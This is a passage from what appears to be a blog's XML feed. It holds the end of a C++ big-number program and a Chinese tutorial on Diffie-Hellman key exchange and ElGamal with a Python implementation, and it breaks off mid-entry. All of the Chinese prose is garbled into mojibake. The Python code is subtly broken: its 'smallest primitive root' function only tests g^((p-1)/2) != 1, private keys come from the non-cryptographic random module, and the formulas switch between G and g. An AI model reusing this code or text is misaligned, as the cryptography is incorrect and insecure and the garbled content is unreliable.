class="hljs-number">1</span>) C.<span class="hljs-built_in">pop_back</span>();<br><span class="hljs-keyword">return</span> C;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> k;<br>cin &gt;&gt; n &gt;&gt; k;<br><span class="hljs-type">int</span> len = n.<span class="hljs-built_in">length</span>();<br><span class="hljs-type">int</span> a,b;<br><span class="hljs-type">int</span> i,j;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; k; i++)<br>&#123;<br>cin &gt;&gt; a &gt;&gt; b;<br>dis[a][b]=<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-built_in">floyd</span>();<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">9</span>;i++)<br>dis[i][i]=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> time;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; i++)<br>&#123;<br>time = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">9</span>; j++)<br>&#123;<br><span class="hljs-keyword">if</span>(dis[i][j])<br>time++;<br>&#125;<br>t[i]=time;<br>&#125;<br><br>A.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>&#123;<br><span class="hljs-keyword">if</span>(t[n[i]-<span class="hljs-string">&#x27;0&#x27;</span>])<br>A=<span class="hljs-built_in">mul</span>(A,t[n[i]-<span class="hljs-string">&#x27;0&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">for</span>(i = A.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>&#123;<br>cout &lt;&lt; A[i];<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>D-Hå¯†é’¥åå•†åè®®ä¸EIGamalç®—æ³•</title>
    <link href="/2023/05/19/D-H%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2%E5%8D%8F%E8%AE%AE%E4%B8%8EEIGamal%E7%AE%97%E6%B3%95/"/>
    <url>/2023/05/19/D-H%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2%E5%8D%8F%E8%AE%AE%E4%B8%8EEIGamal%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="D-Hå¯†é’¥åå•†åè®®">D-Hå¯†é’¥åå•†åè®®</h1><p>åœ¨åŸºäºå¯¹ç§°åŠ å¯†è¿›è¡Œå®‰å…¨é€šä¿¡çš„è¿‡ç¨‹ä¸­ï¼Œé€šä¿¡åŒæ–¹éœ€è¦æŒæœ‰ä¸€ä¸ªå…±äº«çš„å¯†é’¥ã€‚åªæœ‰è¿™æ ·ï¼Œç”±ä»»ä½•ä¸€æ–¹åŠ å¯†çš„ä¿¡æ¯æ‰èƒ½ç”±å¦ä¸€æ–¹ä½¿ç”¨ç›¸åŒçš„å¯†é’¥è§£å¯†ã€‚ä½†æ˜¯<strong>åœ¨èƒ½å¤Ÿå®‰å…¨çš„é€šä¿¡ä¹‹å‰ï¼Œé€šä¿¡åŒæ–¹åº”è¯¥å¦‚ä½•çº¦å®šä¸€ä¸ªå…±äº«çš„å¯†é’¥å‘¢ï¼Ÿè¿™å°±æ˜¯å®‰å…¨ä¸­çš„ç»å…¸é—®é¢˜ï¼šå¯†é’¥é…é€é—®é¢˜</strong></p><p><strong>è§£å†³å¯†é’¥é…é€é—®é¢˜é€šå¸¸æœ‰ä¸‰ç§æ–¹å¼ï¼šçº¿ä¸‹çº¦å®šå…±äº«å¯†é’¥ã€é€šè¿‡å…¬é’¥å¯†ç ä½“ç³»é…é€å…±äº«å¯†é’¥ã€ä»¥åŠDiffie-Hellmanå¯†é’¥äº¤æ¢åè®®</strong></p><p>D-Hå¯†é’¥åå•†åè®®æ˜¯åŸºäºç¦»æ•£å¯¹æ•°å›°éš¾é—®é¢˜çš„å¯†é’¥äº¤æ¢åè®®ï¼Œé¦–å…ˆ</p><ul><li>ç”±åè®®åŒæ–¹Aå’ŒBå…ˆåå•†å¥½å¤§ç´ æ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>ä»¥åŠ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>çš„åŸæ ¹<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span>ï¼Œå¹¶ä¸”å…¬å¼€è¿™ä¸¤ä¸ªå€¼</li><li>Aå–ä¸€ä¸ªç§é’¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span>ï¼Œå‘é€ç»™Bè®¡ç®—ç»“æœ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><msup><mi>G</mi><mi>a</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">A=G^a \mod {p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></li><li>ç±»ä¼¼çš„ï¼ŒBå–ä¸€ä¸ªç§é’¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span>å‘ç»™Aè®¡ç®—ç»“æœ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo>=</mo><msup><mi>G</mi><mi>b</mi></msup><mtext>Â </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext>Â </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">B=G^b\ mod\ {p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mspace">Â </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace">Â </span><span class="mord"><span class="mord mathnormal">p</span></span></span></span></span></li><li>Aè®¡ç®—å‡º<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>=</mo><msup><mi>B</mi><mi>a</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mo>=</mo><mo stretchy="false">(</mo><msup><mi>g</mi><mi>b</mi></msup><msup><mo stretchy="false">)</mo><mi>a</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mo>=</mo><msup><mi>g</mi><mrow><mi>a</mi><mi>b</mi></mrow></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">S=B^a\mod{p}=(g^b)^a\mod{p}=g^{ab}\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ab</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></li><li>Bä¹Ÿèƒ½è®¡ç®—å‡º<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>=</mo><msup><mi>A</mi><mi>b</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mo>=</mo><mo stretchy="false">(</mo><msup><mi>g</mi><mi>a</mi></msup><msup><mo stretchy="false">)</mo><mi>b</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mo>=</mo><msup><mi>g</mi><mrow><mi>a</mi><mi>b</mi></mrow></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">S=A^b\mod{p}=(g^a)^b\mod{p}=g^{ab}\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ab</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></li><li>Aä¸Bå¾—åˆ°å…±äº«å¯†é’¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></li></ul><p>pythonå®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br> <br><br><span class="hljs-comment">#æ±‚æœ€å°åŸæ ¹</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_generator</span>(<span class="hljs-params">n</span>):<br>    k=(n-<span class="hljs-number">1</span>)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,n-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> multimod(i,k,n)!=<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> i<br>        <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">multimod</span>(<span class="hljs-params">a,k,n</span>):    <span class="hljs-comment">#å¿«é€Ÿå¹‚å–æ¨¡</span><br>    ans=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(k!=<span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">if</span> k&amp;<span class="hljs-number">1</span>:<br>            ans = (ans * a) % n<br>        a=(a*a)%n<br>        k=k&gt;&gt;<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> ans<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><br><span class="hljs-comment">#å¾—åˆ°è§„å®šçš„ç´ æ•°</span><br>    p=getPrime(<span class="hljs-number">512</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å¾—åˆ°ç”Ÿæˆçš„éšæœºç´ æ•°ä¸ºï¼š&quot;</span>+<span class="hljs-built_in">str</span>(p))<br><span class="hljs-comment">#å¾—åˆ°ç´ æ•°çš„ä¸€ä¸ªåŸæ ¹</span><br>    G = get_generator(p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(p) + <span class="hljs-string">&#x27; çš„ä¸€ä¸ªåŸæ ¹ä¸ºï¼š&#x27;</span>+<span class="hljs-built_in">str</span>(G))<br><br><span class="hljs-comment">#å¾—åˆ°Açš„ç§é’¥</span><br>    a = random.randint(<span class="hljs-number">0</span>, p-<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Aéšæœºç”Ÿæˆçš„ç§é’¥ä¸ºï¼š&#x27;</span>,a)<br><br><span class="hljs-comment">#å¾—åˆ°Bçš„ç§é’¥</span><br>    b = random.randint(<span class="hljs-number">0</span>, p-<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Béšæœºç”Ÿæˆçš„ç§é’¥ä¸ºï¼š&#x27;</span>,b)<br><br><span class="hljs-comment">#å¾—åˆ°Açš„å…¬é’¥</span><br>    A=multimod(G,a,p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Açš„å…¬é’¥ä¸ºï¼š%d&#x27;</span>%A)<br><br><span class="hljs-comment">#å¾—åˆ°Bçš„å…¬é’¥</span><br>    B=multimod(G,b,p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bçš„å…¬é’¥ä¸ºï¼š%d&#x27;</span>%B)<br><br>    <span class="hljs-comment">#ABè¿›è¡Œå…¬é’¥äº¤æ¢ï¼Œæ”»å‡»è€…åªèƒ½è·å–åˆ°ä¸¤ä¸ªå…¬é’¥</span><br>    <span class="hljs-comment">#ABåˆ†åˆ«ç”¨è‡ªå·±çš„ç§é’¥å†å¯¹å¯¹æ–¹å‘æ¥çš„å…¬é’¥è¿›è¡Œè®¡ç®—</span><br><br>    <span class="hljs-comment">#äº¤æ¢åAçš„å¯†é’¥</span><br>    S1 = <span class="hljs-built_in">pow</span>(B,a,p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Aæœ€åå¾—åˆ°çš„å¯†é’¥ï¼š%d&#x27;</span>%S1)<br>    <span class="hljs-comment">#äº¤æ¢åBçš„å¯†é’¥</span><br>    S2 = <span class="hljs-built_in">pow</span>(A,b,p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bæœ€åå¾—åˆ°çš„å¯†é’¥ï¼š%d&#x27;</span>%S2)<br><br>    <span class="hljs-comment">#æœ€åè®¡ç®—çš„ç»“æœéƒ½æ˜¯</span><br>    <span class="hljs-comment">#g^ab % p</span><br>    <span class="hljs-comment">#ABå®Œæˆå¯†é’¥äº¤æ¢</span><br></code></pre></td></tr></table></figure><h1 id="ElGamalç®—æ³•">ElGamalç®—æ³•</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">è¯¥ç®—æ³•ä¸Difffie-Hellmanéå¸¸ç±»ä¼¼ï¼ŒElGamalçš„ç³»ç»Ÿç”¨æˆ·åœ¨å¾ªç¯ç¾¤<span class="hljs-selector-tag">G</span>å†…é€‰æ‹©ä¸€ä¸ªå¤§ç´ æ•°<span class="hljs-selector-tag">p</span>ï¼Œ<span class="hljs-selector-tag">g</span>æ˜¯<span class="hljs-selector-tag">p</span>çš„åŸæ ¹ï¼Œå°†<span class="hljs-selector-tag">p</span>å’Œ<span class="hljs-selector-tag">g</span>å…¬å¼€<br></code></pre></td></tr></table></figure><h2 id="å¯†é’¥ç”Ÿæˆ">å¯†é’¥ç”Ÿæˆ</h2><ul><li>Aä»<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>2</mn><mo separator="true">,</mo><mi>p</mi><mo>âˆ’</mo><mn>2</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[2,p-2]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">]</span></span></span></span>ä¸­é€‰å–ä¸€ä¸ªæ•´æ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></li><li>è®¡ç®—Açš„å…¬é’¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><msup><mi>g</mi><mi>x</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">y=g^x\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8588em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></li></ul><p>å¯ä»¥å¾—åˆ°ç§é’¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>ï¼Œå…¬é’¥ä¸º{<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mtext>ï¼Œ</mtext><mi>p</mi><mtext>ï¼Œ</mtext><mi>g</mi><mtext>ï¼Œ</mtext><mi>y</mi></mrow><annotation encoding="application/x-tex">{Gï¼Œpï¼Œgï¼Œy}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></span>}ï¼Œå…¬å¼€å…¬é’¥ã€‚</p><h2 id="åŠ å¯†">åŠ å¯†</h2><p>Bä½¿ç”¨Aå…¬å¼€çš„{<span class="katex"><span class="katex-mathml"><math 